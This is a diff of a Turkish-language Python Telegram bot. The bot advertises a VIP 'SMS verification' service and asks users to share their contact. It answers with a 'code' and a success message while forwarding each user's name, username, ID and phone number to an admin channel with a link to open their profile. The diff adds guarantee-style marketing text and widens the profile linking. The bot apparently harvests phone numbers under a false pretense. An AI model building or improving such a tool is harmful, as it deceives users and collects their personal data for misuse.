@@ -6,6 +6,7 @@ from zoneinfo import ZoneInfo
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
 
+# Bot token ve ID’ler environment değişkenlerinden alınacak
 TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
 KANAL_ID = int(os.getenv("KANAL_ID"))
@@ -13,6 +14,7 @@ KANAL_ID = int(os.getenv("KANAL_ID"))
 waiting_number = set()
 selected_country = {}
 
+# Banlı kullanıcılar
 if os.path.exists("banned.json"):
     with open("banned.json", "r") as f:
         banned_users = set(json.load(f))
@@ -23,6 +25,7 @@ def save_bans():
     with open("banned.json", "w") as f:
         json.dump(list(banned_users), f)
 
+# Ana menü
 def main_menu():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🚀 SMS ONAY BAŞLAT", callback_data="sms")],
@@ -30,6 +33,7 @@ def main_menu():
         [InlineKeyboardButton("📈 GELİŞTİRİCİ", callback_data="gelistirici")]
     ])
 
+# Ülke menüsü
 def country_menu():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🇹🇷 Türkiye", callback_data="country_tr"),
@@ -44,6 +48,7 @@ def country_menu():
          InlineKeyboardButton("🇰🇷 Güney Kore", callback_data="country_kr")]
     ])
 
+# /start komutu
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if user.id in banned_users:
@@ -70,13 +75,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(text, reply_markup=main_menu())
 
+# Menü butonları
 async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     user = query.from_user
     if user.id in banned_users:
         return
     await query.answer()
-
     data = query.data
 
     if data == "sms":
@@ -109,6 +114,7 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 Ülke: {country_name}
 🚀 Butona basarak SMS ONAY yapabilirsiniz!
+💎 VIP işlem garantili
 """, reply_markup=kb)
 
     elif data == "profil":
@@ -133,6 +139,7 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ✨ Premium destek ve geliştirmeler için iletişim kurabilirsiniz.
 """)
 
+# SMS ONAY / Contact handler
 async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if user.id in banned_users:
@@ -154,32 +161,32 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 Ülke: {country_name}
 🔢 Kodunuz: {code}
 📲 İşlem Başarılı!
+💎 VIP Onay Sistemi
 """)
 
     phone = update.message.contact.phone_number
-    username = f"@{user.username}" if user.username else "Yok"
+    username = f"@{user.username}" if user.username else None
     name = user.first_name
 
     text = f"""
 ☎️ NUMARA ALINDI
 
 👤 İsim: {name}
-🔗 Kullanıcı: {username}
+🔗 Kullanıcı: {username if username else 'Yok'}
 🆔 ID: {user.id}
 📱 Numara: {phone}
 ⏰ Saat: {time}
 """
 
-    # Admin kanalına mesaj, altına tek buton: profili aç
-    if user.username:
-        profile_url = f"https://t.me/{user.username}"
-        kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📂 Profili Aç", url=profile_url)]
-        ])
-        await context.bot.send_message(chat_id=KANAL_ID, text=text, reply_markup=kb)
-    else:
-        await context.bot.send_message(chat_id=KANAL_ID, text=text)
+    # Profil butonu: username varsa link, yoksa tg://user?id ile açılır
+    profile_url = f"https://t.me/{user.username}" if user.username else f"tg://user?id={user.id}"
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📂 Profili Aç", url=profile_url)]
+    ])
 
+    await context.bot.send_message(chat_id=KANAL_ID, text=text, reply_markup=kb)
+
+# Ban ve unban komutları
 async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -208,6 +215,7 @@ async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text("❌ Geçersiz ID")
 
+# Bot uygulaması
 app = ApplicationBuilder().token(TOKEN).build()
 
 app.add_handler(CommandHandler("start", start))
@@ -217,4 +225,3 @@ app.add_handler(CallbackQueryHandler(menu_buttons))
 app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
 
 app.run_polling()
-    
